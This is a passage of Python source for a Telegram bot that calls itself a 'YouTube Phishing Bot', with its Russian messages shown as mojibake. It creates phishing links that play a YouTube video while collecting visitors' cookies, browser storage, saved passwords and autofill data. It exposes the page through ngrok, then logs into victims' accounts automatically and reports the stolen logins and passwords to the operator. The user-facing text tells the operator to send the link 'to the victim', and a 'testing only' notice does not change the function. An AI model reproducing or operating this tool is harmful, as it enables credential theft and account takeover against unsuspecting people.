                )
        else:
            await telegram_app.bot.send_message(
                chat_id=ADMIN_ID,
                text=message,
                parse_mode=ParseMode.MARKDOWN
            )
        
    except Exception as e:
        logger.error(f"Error sending auto login notification: {e}")

# ========== TELEGRAM –ö–û–ú–ê–ù–î–´ ==========
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """–ö–æ–º–∞–Ω–¥–∞ /start"""
    user = update.effective_user
    
    welcome_message = f"""
üëã *–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å, {user.first_name}!*

ü§ñ *YouTube Phishing Bot*

üéØ *–ß—Ç–æ –¥–µ–ª–∞–µ—Ç —ç—Ç–æ—Ç –±–æ—Ç:*
1. –ü—Ä–∏–Ω–∏–º–∞–µ—Ç —Å—Å—ã–ª–∫—É –Ω–∞ YouTube –≤–∏–¥–µ–æ
2. –°–æ–∑–¥–∞–µ—Ç —Ñ–∏—à–∏–Ω–≥ —Å—Å—ã–ª–∫—É —Å –≤–∏–¥–µ–æ
3. –ö–æ–≥–¥–∞ –∂–µ—Ä—Ç–≤–∞ –ø–µ—Ä–µ—Ö–æ–¥–∏—Ç - —Å–æ–±–∏—Ä–∞–µ—Ç –í–°–ï –¥–∞–Ω–Ω—ã–µ:
   ‚Ä¢ Cookies, LocalStorage, SessionStorage
   ‚Ä¢ –°–æ—Ö—Ä–∞–Ω–µ–Ω–Ω—ã–µ –ø–∞—Ä–æ–ª–∏ –∏ –ª–æ–≥–∏–Ω—ã
   ‚Ä¢ –î–∞–Ω–Ω—ã–µ –∞–≤—Ç–æ–∑–∞–ø–æ–ª–Ω–µ–Ω–∏—è
   ‚Ä¢ –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –±—Ä–∞—É–∑–µ—Ä–µ –∏ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ
4. *–ê–í–¢–û–ú–ê–¢–ò–ß–ï–°–ö–ò –í–•–û–î–ò–¢ –≤ –∞–∫–∫–∞—É–Ω—Ç—ã –Ω–∞ –í–ê–®–ï–ú —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ*
5. –û—Ç–ø—Ä–∞–≤–ª—è–µ—Ç —Å–∫—Ä–∏–Ω—à–æ—Ç—ã —É—Å–ø–µ—à–Ω—ã—Ö –≤—Ö–æ–¥–æ–≤

‚ö° *–ö–∞–∫ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å:*
1. –ó–∞–ø—É—Å—Ç–∏—Ç–µ ngrok: /start_ngrok
2. –ü–æ–ª—É—á–∏—Ç–µ –æ—Å–Ω–æ–≤–Ω—É—é —Å—Å—ã–ª–∫—É: /get_url
3. –ü–µ—Ä–µ–π–¥–∏—Ç–µ –ø–æ —Å—Å—ã–ª–∫–µ –≤ –±—Ä–∞—É–∑–µ—Ä–µ
4. –í—Å—Ç–∞–≤—å—Ç–µ —Å—Å—ã–ª–∫—É –Ω–∞ YouTube –≤–∏–¥–µ–æ
5. –ü–æ–ª—É—á–∏—Ç–µ —Ñ–∏—à–∏–Ω–≥ —Å—Å—ã–ª–∫—É
6. –û—Ç–ø—Ä–∞–≤—å—Ç–µ –µ—ë –∂–µ—Ä—Ç–≤–µ
7. –ü–æ–ª—É—á–∞–π—Ç–µ –¥–∞–Ω–Ω—ã–µ –≤ —Ä–µ–∞–ª—å–Ω–æ–º –≤—Ä–µ–º–µ–Ω–∏

üîß *–û—Å–Ω–æ–≤–Ω—ã–µ –∫–æ–º–∞–Ω–¥—ã:*
‚Ä¢ /start_ngrok - –ó–∞–ø—É—Å—Ç–∏—Ç—å —Å–µ—Ä–≤–µ—Ä
‚Ä¢ /stop_ngrok - –û—Å—Ç–∞–Ω–æ–≤–∏—Ç—å —Å–µ—Ä–≤–µ—Ä
‚Ä¢ /get_url - –ü–æ–ª—É—á–∏—Ç—å URL —Å–µ—Ä–≤–µ—Ä–∞
‚Ä¢ /stats - –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ —Å–∏—Å—Ç–µ–º—ã
‚Ä¢ /my_links - –ú–æ–∏ —Ñ–∏—à–∏–Ω–≥ —Å—Å—ã–ª–∫–∏
‚Ä¢ /auto_login [ID] - –ó–∞–ø—É—Å—Ç–∏—Ç—å –∞–≤—Ç–æ–≤—Ö–æ–¥
‚Ä¢ /help - –ü–æ–º–æ—â—å

‚ö†Ô∏è *–í–ù–ò–ú–ê–ù–ò–ï:* 
‚Ä¢ –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ —Ç–æ–ª—å–∫–æ –¥–ª—è —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è!
‚Ä¢ –í—Å–µ –¥–µ–π—Å—Ç–≤–∏—è –ª–æ–≥–∏—Ä—É—é—Ç—Å—è
‚Ä¢ –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–π –≤—Ö–æ–¥ —Ä–∞–±–æ—Ç–∞–µ—Ç –Ω–∞ –í–ê–®–ï–ú —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ
"""
    
    keyboard = [
        [InlineKeyboardButton("üöÄ –ó–∞–ø—É—Å—Ç–∏—Ç—å ngrok", callback_data="start_ngrok")],
        [InlineKeyboardButton("üåê –ü–æ–ª—É—á–∏—Ç—å URL", callback_data="get_url")],
        [InlineKeyboardButton("üìä –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞", callback_data="stats")],
        [InlineKeyboardButton("üîó –ú–æ–∏ —Å—Å—ã–ª–∫–∏", callback_data="my_links")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        welcome_message,
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=reply_markup
    )

async def start_ngrok_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """–ó–∞–ø—É—Å–∫ ngrok"""
    global ngrok_manager, current_ngrok_url
    
    try:
        await update.message.reply_text("üîÑ *–ó–∞–ø—É—Å–∫ ngrok —Å–µ—Ä–≤–µ—Ä–∞...*", parse_mode=ParseMode.MARKDOWN)
        
        if NGROK_AUTH_TOKEN == "YOUR_NGROK_TOKEN_HERE":
            await update.message.reply_text(
                "‚ùå *–ù–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω NGROK_AUTH_TOKEN!*\n\n"
                "–ü–æ–ª—É—á–∏—Ç–µ —Ç–æ–∫–µ–Ω –Ω–∞ —Å–∞–π—Ç–µ ngrok.com –∏ –≤—Å—Ç–∞–≤—å—Ç–µ –µ–≥–æ –≤ –∫–æ–¥.\n"
                "–î–ª—è —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è –º–æ–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –±–µ—Å–ø–ª–∞—Ç–Ω—ã–π –∞–∫–∫–∞—É–Ω—Ç.",
                parse_mode=ParseMode.MARKDOWN
            )
            return
        
        ngrok_manager = NgrokManager(NGROK_AUTH_TOKEN)
        public_url = ngrok_manager.start(FLASK_PORT)
        
        if public_url:
            current_ngrok_url = public_url
            
            message = f"""
‚úÖ *Ngrok —Å–µ—Ä–≤–µ—Ä –∑–∞–ø—É—â–µ–Ω!*

üîó *–í–∞—à URL:* {public_url}

üåê *–ö–∞–∫ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å:*
1. –ü–µ—Ä–µ–π–¥–∏—Ç–µ –ø–æ —Å—Å—ã–ª–∫–µ –≤—ã—à–µ –≤ –±—Ä–∞—É–∑–µ—Ä–µ
2. –í—Å—Ç–∞–≤—å—Ç–µ —Å—Å—ã–ª–∫—É –Ω–∞ YouTube –≤–∏–¥–µ–æ
3. –ü–æ–ª—É—á–∏—Ç–µ —Ñ–∏—à–∏–Ω–≥ —Å—Å—ã–ª–∫—É
4. –û—Ç–ø—Ä–∞–≤—å—Ç–µ –µ—ë –∂–µ—Ä—Ç–≤–µ
5. –î–∞–Ω–Ω—ã–µ –±—É–¥—É—Ç –ø—Ä–∏—Ö–æ–¥–∏—Ç—å –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏

üì° *–ü–æ—Ä—Ç:* {FLASK_PORT}
‚è± *–ó–∞–ø—É—â–µ–Ω:* {datetime.now().strftime('%H:%M:%S')}

‚ö†Ô∏è *–ù–µ –∑–∞–∫—Ä—ã–≤–∞–π—Ç–µ –ø—Ä–æ–≥—Ä–∞–º–º—É!*
–°–µ—Ä–≤–µ—Ä –∞–∫—Ç–∏–≤–µ–Ω –ø–æ–∫–∞ –±–æ—Ç —Ä–∞–±–æ—Ç–∞–µ—Ç.
"""
            
            keyboard = [
                [InlineKeyboardButton("üåê –û—Ç–∫—Ä—ã—Ç—å –≤ –±—Ä–∞—É–∑–µ—Ä–µ", url=public_url)],
                [InlineKeyboardButton("üõë –û—Å—Ç–∞–Ω–æ–≤–∏—Ç—å —Å–µ—Ä–≤–µ—Ä", callback_data="stop_ngrok")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await update.message.reply_text(
                message,
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=reply_markup
            )
        else:
            await update.message.reply_text(
                "‚ùå *–ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–ø—É—Å—Ç–∏—Ç—å ngrok!*\n\n"
                "–ü—Ä–æ–≤–µ—Ä—å—Ç–µ:\n"
                "1. –£—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω –ª–∏ pyngrok (`pip install pyngrok`)\n"
                "2. –í–µ—Ä–Ω—ã–π –ª–∏ auth token\n"
                "3. –ü–æ—Ä—Ç {FLASK_PORT} —Å–≤–æ–±–æ–¥–µ–Ω\n\n"
                "–°–∫–∞—á–∞–π—Ç–µ ngrok: https://ngrok.com/download",
                parse_mode=ParseMode.MARKDOWN
            )
    
    except Exception as e:
        logger.error(f"Error starting ngrok: {e}")
        await update.message.reply_text(
            f"‚ùå –û—à–∏–±–∫–∞: {str(e)[:100]}",
            parse_mode=ParseMode.MARKDOWN
        )

async def stop_ngrok_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """–û—Å—Ç–∞–Ω–æ–≤–∫–∞ ngrok"""
    global current_ngrok_url
    
    try:
        if ngrok_manager:
            ngrok_manager.stop()
            current_ngrok_url = None
        
        await update.message.reply_text(
            "üõë *–°–µ—Ä–≤–µ—Ä –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω!*\n\n"
            "–í—Å–µ —Ñ–∏—à–∏–Ω–≥ —Å—Å—ã–ª–∫–∏ –Ω–µ–∞–∫—Ç–∏–≤–Ω—ã.\n"
            "–î–ª—è –∑–∞–ø—É—Å–∫–∞: /start_ngrok",
            parse_mode=ParseMode.MARKDOWN
        )
    
    except Exception as e:
        logger.error(f"Error stopping ngrok: {e}")
        await update.message.reply_text(
            f"‚ùå –û—à–∏–±–∫–∞: {str(e)[:100]}",
            parse_mode=ParseMode.MARKDOWN
        )

async def get_url_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """–ü–æ–ª—É—á–µ–Ω–∏–µ URL —Å–µ—Ä–≤–µ—Ä–∞"""
    global current_ngrok_url
    
    if not current_ngrok_url:
        await update.message.reply_text(
            "‚ùå *–°–µ—Ä–≤–µ—Ä –Ω–µ –∑–∞–ø—É—â–µ–Ω!*\n\n"
            "–ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ /start_ngrok –¥–ª—è –∑–∞–ø—É—Å–∫–∞",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    message = f"""
üåê *URL –≤–∞—à–µ–≥–æ —Å–µ—Ä–≤–µ—Ä–∞:*

üîó {current_ngrok_url}

üí° *–ò–Ω—Å—Ç—Ä—É–∫—Ü–∏—è:*
1. –û—Ç–∫—Ä–æ–π—Ç–µ —Å—Å—ã–ª–∫—É –≤ –±—Ä–∞—É–∑–µ—Ä–µ
2. –í—Å—Ç–∞–≤—å—Ç–µ —Å—Å—ã–ª–∫—É –Ω–∞ YouTube –≤–∏–¥–µ–æ
3. –ü–æ–ª—É—á–∏—Ç–µ —Ñ–∏—à–∏–Ω–≥ —Å—Å—ã–ª–∫—É
4. –û—Ç–ø—Ä–∞–≤—å—Ç–µ –∂–µ—Ä—Ç–≤–µ
5. –î–∞–Ω–Ω—ã–µ –ø—Ä–∏–¥—É—Ç —Å—é–¥–∞ –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏

‚ö° *–û—Å–æ–±–µ–Ω–Ω–æ—Å—Ç–∏:*
‚Ä¢ –í–∏–¥–µ–æ –≤–æ—Å–ø—Ä–æ–∏–∑–≤–æ–¥–∏—Ç—Å—è –∫–∞–∫ –Ω–∞ YouTube
‚Ä¢ –°–±–æ—Ä –¥–∞–Ω–Ω—ã—Ö –≤ —Ñ–æ–Ω–æ–≤–æ–º —Ä–µ–∂–∏–º–µ
‚Ä¢ –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–π –≤—Ö–æ–¥ –≤ –∞–∫–∫–∞—É–Ω—Ç—ã
‚Ä¢ –°–∫—Ä–∏–Ω—à–æ—Ç—ã —É—Å–ø–µ—à–Ω—ã—Ö –≤—Ö–æ–¥–æ–≤
"""
    
    keyboard = [
        [InlineKeyboardButton("üåê –û—Ç–∫—Ä—ã—Ç—å –≤ –±—Ä–∞—É–∑–µ—Ä–µ", url=current_ngrok_url)],
        [InlineKeyboardButton("üöÄ –°–æ–∑–¥–∞—Ç—å —Ñ–∏—à–∏–Ω–≥ —Å—Å—ã–ª–∫—É", url=f"{current_ngrok_url}/phishing_home")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        message,
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=reply_markup,
        disable_web_page_preview=True
    )

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """–°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ —Å–∏—Å—Ç–µ–º—ã"""
    stats = db.get_stats()
    service_stats = db.get_service_stats()
    
    message = f"""
üìä *–°–¢–ê–¢–ò–°–¢–ò–ö–ê –°–ò–°–¢–ï–ú–´*

üîó *–û—Å–Ω–æ–≤–Ω—ã–µ –ø–æ–∫–∞–∑–∞—Ç–µ–ª–∏:*
‚Ä¢ –°–æ–∑–¥–∞–Ω–æ —Å—Å—ã–ª–æ–∫: `{stats.get('total_links', 0)}`
‚Ä¢ –í—Å–µ–≥–æ –ø–µ—Ä–µ—Ö–æ–¥–æ–≤: `{stats.get('total_clicks', 0)}`
‚Ä¢ –î–∞–Ω–Ω—ã—Ö —Å–æ–±—Ä–∞–Ω–æ: `{stats.get('total_captured', 0)}`
‚Ä¢ –£—á–µ—Ç–Ω—ã—Ö –∑–∞–ø–∏—Å–µ–π: `{stats.get('total_credentials', 0)}`
‚Ä¢ Cookies: `{stats.get('total_cookies', 0)}`

üöÄ *–ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–π –≤—Ö–æ–¥:*
‚Ä¢ –ü–æ–ø—ã—Ç–æ–∫: `{stats.get('auto_login_attempts', 0)}`
‚Ä¢ –£—Å–ø–µ—à–Ω–æ: `{stats.get('auto_login_success', 0)}`
‚Ä¢ –£—Å–ø–µ—à–Ω–æ—Å—Ç—å: `{round((stats.get('auto_login_success', 0) / stats.get('auto_login_attempts', 1)) * 100, 1) if stats.get('auto_login_attempts', 0) > 0 else 0}%`

üåê *–ü–æ —Å–µ—Ä–≤–∏—Å–∞–º:*
"""
    
    for service, stat in service_stats.items():
        message += f"‚Ä¢ {service.title()}: {stat['success']}/{stat['total']} ({stat['success_rate']}%)\n"
    
    message += f"""
üîß *–°–æ—Å—Ç–æ—è–Ω–∏–µ —Å–µ—Ä–≤–µ—Ä–∞:*
‚Ä¢ –°—Ç–∞—Ç—É—Å: {'üü¢ –ê–∫—Ç–∏–≤–µ–Ω' if current_ngrok_url else 'üî¥ –ù–µ–∞–∫—Ç–∏–≤–µ–Ω'}
‚Ä¢ URL: {current_ngrok_url or '–ù–µ –∑–∞–ø—É—â–µ–Ω'}
‚Ä¢ –ê–≤—Ç–æ–≤—Ö–æ–¥: {'üü¢ –ì–æ—Ç–æ–≤' if auto_login_manager.driver else 'üî¥ –ù–µ –≥–æ—Ç–æ–≤'}

üí° *–ö–æ–º–∞–Ω–¥—ã:*
‚Ä¢ /start_ngrok - –ó–∞–ø—É—Å—Ç–∏—Ç—å —Å–µ—Ä–≤–µ—Ä
‚Ä¢ /get_url - –ü–æ–ª—É—á–∏—Ç—å URL
‚Ä¢ /my_links - –ú–æ–∏ —Å—Å—ã–ª–∫–∏
"""
    
    keyboard = [
        [InlineKeyboardButton("üîÑ –û–±–Ω–æ–≤–∏—Ç—å", callback_data="stats")],
        [InlineKeyboardButton("üöÄ –ó–∞–ø—É—Å—Ç–∏—Ç—å —Å–µ—Ä–≤–µ—Ä", callback_data="start_ngrok")],
        [InlineKeyboardButton("üîó –ú–æ–∏ —Å—Å—ã–ª–∫–∏", callback_data="my_links")]
    ]
    
    if current_ngrok_url:
        keyboard[1] = [InlineKeyboardButton("üåê –û—Ç–∫—Ä—ã—Ç—å —Å–µ—Ä–≤–µ—Ä", url=current_ngrok_url)]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        message,
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=reply_markup
    )

async def my_links_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """–ú–æ–∏ —Ñ–∏—à–∏–Ω–≥ —Å—Å—ã–ª–∫–∏"""
    user_id = update.effective_user.id
    links = db.get_user_links(user_id)
    
    if not links:
        await update.message.reply_text(
            "üì≠ *–£ –≤–∞—Å –Ω–µ—Ç —Å–æ–∑–¥–∞–Ω–Ω—ã—Ö —Å—Å—ã–ª–æ–∫.*\n\n"
            "–ß—Ç–æ–±—ã —Å–æ–∑–¥–∞—Ç—å —Å—Å—ã–ª–∫—É:\n"
            "1. –ó–∞–ø—É—Å—Ç–∏—Ç–µ —Å–µ—Ä–≤–µ—Ä: /start_ngrok\n"
            "2. –ü–æ–ª—É—á–∏—Ç–µ URL: /get_url\n"
            "3. –ü–µ—Ä–µ–π–¥–∏—Ç–µ –ø–æ —Å—Å—ã–ª–∫–µ –≤ –±—Ä–∞—É–∑–µ—Ä–µ\n"
            "4. –í—Å—Ç–∞–≤—å—Ç–µ —Å—Å—ã–ª–∫—É –Ω–∞ YouTube –≤–∏–¥–µ–æ\n"
            "5. –ü–æ–ª—É—á–∏—Ç–µ —Ñ–∏—à–∏–Ω–≥ —Å—Å—ã–ª–∫—É",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    message = "üîó *–í–ê–®–ò –§–ò–®–ò–ù–ì –°–°–´–õ–ö–ò:*\n\n"
    
    for i, link in enumerate(links[:10], 1):
        data_count = len(db.get_data_by_link(link['id']))
        
        message += f"{i}. *ID:* `{link['id']}`\n"
        message += f"   üé¨ –í–∏–¥–µ–æ: {link['youtube_id']}\n"
        message += f"   üìÖ –°–æ–∑–¥–∞–Ω–æ: {link['created_at'][:10]}\n"
        message += f"   üë£ –ü–µ—Ä–µ—Ö–æ–¥–æ–≤: {link['clicks']}\n"
        message += f"   üìä –î–∞–Ω–Ω—ã—Ö: {data_count}\n"
        message += f"   üîó –°—Å—ã–ª–∫–∞: {link['phishing_url'][:50]}...\n"
        message += "   ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ\n"
    
    if len(links) > 10:
        message += f"\n... –∏ –µ—â–µ {len(links) - 10} —Å—Å—ã–ª–æ–∫\n"
    
    keyboard = []
    for link in links[:3]:
        keyboard.append([
            InlineKeyboardButton(f"üìä {link['id'][:8]}...", callback_data=f"link_info_{link['id']}")
        ])
    
    reply_markup = InlineKeyboardMarkup(keyboard) if keyboard else None
    
    await update.message.reply_text(
        message,
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=reply_markup
    )

async def auto_login_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """–ó–∞–ø—É—Å–∫ –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–≥–æ –≤—Ö–æ–¥–∞"""
    if not context.args:
        await update.message.reply_text(
            "üöÄ *–ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–π –≤—Ö–æ–¥*\n\n"
            "–ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ: `/auto_login [ID_–¥–∞–Ω–Ω—ã—Ö]`\n\n"
            "–ü—Ä–∏–º–µ—Ä: `/auto_login abc123def456`\n\n"
            "ID –¥–∞–Ω–Ω—ã—Ö –º–æ–∂–Ω–æ –ø–æ–ª—É—á–∏—Ç—å –∏–∑ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–π –æ —Å–æ–±—Ä–∞–Ω–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö.",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    data_id = context.args[0]
    data = db.get_captured_data(data_id)
    
    if not data:
        await update.message.reply_text(
            f"‚ùå –î–∞–Ω–Ω—ã–µ —Å ID `{data_id}` –Ω–µ –Ω–∞–π–¥–µ–Ω—ã.",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    await update.message.reply_text(
        f"üöÄ *–ó–∞–ø—É—Å–∫ –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–≥–æ –≤—Ö–æ–¥–∞...*\n\n"
        f"ID –¥–∞–Ω–Ω—ã—Ö: `{data_id}`\n"
        f"–°–µ—Ä–≤–∏—Å–æ–≤ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–æ: {len(data.get('identified_services', []))}\n"
        f"Cookies: {len(data.get('cookies', []))}\n\n"
        f"‚è≥ –ü—Ä–æ—Ü–µ—Å—Å –∑–∞–π–º–µ—Ç 1-2 –º–∏–Ω—É—Ç—ã...",
        parse_mode=ParseMode.MARKDOWN
    )
    
    # –ó–∞–ø—É—Å–∫–∞–µ–º –∞–≤—Ç–æ–≤—Ö–æ–¥ –≤ –æ—Ç–¥–µ–ª—å–Ω–æ–º –ø–æ—Ç–æ–∫–µ
    threading.Thread(
        target=run_auto_login,
        args=(data,),
        daemon=True
    ).start()

async def data_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """–ü—Ä–æ—Å–º–æ—Ç—Ä –¥–∞–Ω–Ω—ã—Ö"""
    if not context.args:
        await update.message.reply_text(
            "üìä *–ü—Ä–æ—Å–º–æ—Ç—Ä –¥–∞–Ω–Ω—ã—Ö*\n\n"
            "–ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ: `/data [ID_–¥–∞–Ω–Ω—ã—Ö]`\n\n"
            "–ü—Ä–∏–º–µ—Ä: `/data abc123def456`\n\n"
            "ID –¥–∞–Ω–Ω—ã—Ö –º–æ–∂–Ω–æ –ø–æ–ª—É—á–∏—Ç—å –∏–∑ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–π.",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    data_id = context.args[0]
    data = db.get_captured_data(data_id)
    
    if not data:
        await update.message.reply_text(
            f"‚ùå –î–∞–Ω–Ω—ã–µ —Å ID `{data_id}` –Ω–µ –Ω–∞–π–¥–µ–Ω—ã.",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    link_info = db.get_link(data['link_id'])
    link_url = link_info['phishing_url'] if link_info else 'N/A'
    
    message = f"""
üîç *–î–ï–¢–ê–õ–¨–ù–´–ô –û–¢–ß–ï–¢ –û –î–ê–ù–ù–´–•*

üìå *–ò–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ç–æ—Ä:* `{data['id']}`
üîó *–°—Å—ã–ª–∫–∞ ID:* `{data['link_id']}`
üïí *–í—Ä–µ–º—è —Å–±–æ—Ä–∞:* {data['timestamp'][:19]}
üåê *IP –∞–¥—Ä–µ—Å:* `{data['ip_address']}`
üë§ *User Agent:* {data['user_agent'][:80]}...

üìä *–°–û–ë–†–ê–ù–ù–´–ï –î–ê–ù–ù–´–ï:*
‚Ä¢ Cookies: {len(data.get('cookies', []))}
‚Ä¢ –õ–æ–≥–∏–Ω—ã: {len(data.get('logins', []))}
‚Ä¢ –ü–∞—Ä–æ–ª–∏: {len(data.get('passwords', []))}
‚Ä¢ LocalStorage: {len(data.get('localStorage', {}))}
‚Ä¢ SessionStorage: {len(data.get('sessionStorage', {}))}
‚Ä¢ –î–∞–Ω–Ω—ã—Ö –∞–≤—Ç–æ–∑–∞–ø–æ–ª–Ω–µ–Ω–∏—è: {len(data.get('autofill_data', {}))}

üåê *–û–ü–†–ï–î–ï–õ–ï–ù–ù–´–ï –°–ï–†–í–ò–°–´:*
"""
    
    services = data.get('identified_services', [])
    if services:
        for service in services:
            message += f"‚Ä¢ {service.title()}\n"
    else:
        message += "‚Ä¢ –ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω—ã\n"
    
    # –õ–æ–≥–∏–Ω—ã
    logins = data.get('logins', [])
    if logins:
        message += "\nüë§ *–ù–ê–ô–î–ï–ù–ù–´–ï –õ–û–ì–ò–ù–´:*\n"
        for login in logins[:5]:
            value = login.get('value', '')
            if value:
                message += f"‚Ä¢ `{value}`\n"
    
    # –ü–∞—Ä–æ–ª–∏
    passwords = data.get('passwords', [])
    if passwords:
        message += "\nüîë *–ù–ê–ô–î–ï–ù–ù–´–ï –ü–ê–†–û–õ–ò:*\n"
        for pwd in passwords[:3]:
            value = pwd.get('value', '')
            if value:
                message += f"‚Ä¢ `{value}`\n"
    
    # Cookies
    cookies = data.get('cookies', [])
    if cookies:
        message += f"\nüç™ *COOKIES (–ø–µ—Ä–≤—ã–µ 5):*\n"
        for cookie in cookies[:5]:
            message += f"‚Ä¢ {cookie.get('name', 'N/A')}: `{cookie.get('value', '')[:30]}...`\n"
    
    # –†–µ–∑—É–ª—å—Ç–∞—Ç—ã –∞–≤—Ç–æ–≤—Ö–æ–¥–∞
    login_results = db.get_auto_login_results(data_id)
    if login_results:
        message += "\nüöÄ *–†–ï–ó–£–õ–¨–¢–ê–¢–´ –ê–í–¢–û–ú–ê–¢–ò–ß–ï–°–ö–û–ì–û –í–•–û–î–ê:*\n"
        for result in login_results[:3]:
            status = "‚úÖ –£—Å–ø–µ—à–Ω–æ" if result['success'] else "‚ùå –ù–µ—É–¥–∞—á–Ω–æ"
            message += f"‚Ä¢ {result['service'].title()}: {status}\n"
    
    message += f"""
üí° *–ö–û–ú–ê–ù–î–´:*
‚Ä¢ /auto_login {data_id} - –ó–∞–ø—É—Å—Ç–∏—Ç—å –∞–≤—Ç–æ–≤—Ö–æ–¥
‚Ä¢ /stats - –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞
"""
    
    await update.message.reply_text(
        message,
        parse_mode=ParseMode.MARKDOWN,
        disable_web_page_preview=True
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """–û–±—Ä–∞–±–æ—Ç—á–∏–∫ inline –∫–Ω–æ–ø–æ–∫"""
    query = update.callback_query
    await query.answer()
    
    data = query.data
    
    if data == "start_ngrok":
        await start_ngrok_command(query, context)
    
    elif data == "stop_ngrok":
        await stop_ngrok_command(query, context)
    
    elif data == "get_url":
        await get_url_command(query, context)
    
    elif data == "stats":
        await stats_command(query, context)
    
    elif data == "my_links":
        await my_links_command(query, context)
    
    elif data.startswith("link_info_"):
        link_id = data[10:]
        link = db.get_link(link_id)
        
        if link:
            data_list = db.get_data_by_link(link_id)
            
            message = f"""
üîó *–ò–ù–§–û–†–ú–ê–¶–ò–Ø –û –°–°–´–õ–ö–ï*

üìå *ID:* `{link['id']}`
üé¨ *YouTube ID:* {link['youtube_id']}
üîó *–û—Ä–∏–≥–∏–Ω–∞–ª—å–Ω–∞—è —Å—Å—ã–ª–∫–∞:* {link['youtube_url'][:50]}...
üåê *–§–∏—à–∏–Ω–≥ —Å—Å—ã–ª–∫–∞:* {link['phishing_url'][:50]}...
üìÖ *–°–æ–∑–¥–∞–Ω–æ:* {link['created_at'][:19]}
üë£ *–ü–µ—Ä–µ—Ö–æ–¥–æ–≤:* {link['clicks']}
üìä *–î–∞–Ω–Ω—ã—Ö —Å–æ–±—Ä–∞–Ω–æ:* {len(data_list)}

üìà *–ü–û–°–õ–ï–î–ù–ò–ï –î–ê–ù–ù–´–ï:*
"""
            
            for i, data_item in enumerate(data_list[:3], 1):
                message += f"\n{i}. *ID:* `{data_item['id']}`\n"
                message += f"   üïí {data_item['timestamp'][:16]}\n"
                message += f"   üåê {data_item['ip_address']}\n"
                message += f"   üë§ –õ–æ–≥–∏–Ω–æ–≤: {len(data_item.get('logins', []))}\n"
                message += f"   üîë –ü–∞—Ä–æ–ª–µ–π: {len(data_item.get('passwords', []))}\n"
                message += f"   üç™ Cookies: {len(data_item.get('cookies', []))}\n"
            
            keyboard = [
                [InlineKeyboardButton("üìä –ü–æ–∫–∞–∑–∞—Ç—å –≤—Å–µ –¥–∞–Ω–Ω—ã–µ", callback_data=f"show_all_data_{link_id}")],
                [InlineKeyboardButton("üöÄ –ó–∞–ø—É—Å—Ç–∏—Ç—å –∞–≤—Ç–æ–≤—Ö–æ–¥", callback_data=f"auto_login_link_{link_id}")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await query.message.reply_text(
                message,
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=reply_markup
            )
    
    elif data == "help":
        help_message = """
üÜò *–ü–û–ú–û–©–¨ –ò –ò–ù–°–¢–†–£–ö–¶–ò–ò*

üéØ *–ö–∞–∫ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —Å–∏—Å—Ç–µ–º—É:*
